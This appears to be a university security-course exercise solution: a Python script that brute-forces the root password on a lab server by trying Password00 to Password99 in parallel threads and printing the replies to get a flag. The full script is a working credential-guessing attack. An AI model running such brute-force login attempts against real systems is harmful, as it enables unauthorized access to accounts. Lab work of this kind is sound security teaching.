import socket
import concurrent.futures

# Fill in the right target here
HOST = 'netsec.net.in.tum.de'
PORT = 30053

def password_gen():
    return (map(lambda n: 'Password' + str(n).zfill(2), range(0,100)))


def get_flag():
    executor = concurrent.futures.ThreadPoolExecutor(100)
    futures = [executor.submit(try_password, p) for p in password_gen()]
    concurrent.futures.wait(futures)
    for f in futures:
        print(f.result())

# return p if correct
def try_password(p):
    print('current guess: ', p)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    sf = s.makefile('rw')  # we use a file abstraction for the sockets
    
    sf.write('root,' + p + '\n'); # enter password
    sf.flush()
    line = sf.readline(); # read result

    sf.close()
    s.close()
    return line

if __name__ == '__main__':
    get_flag()
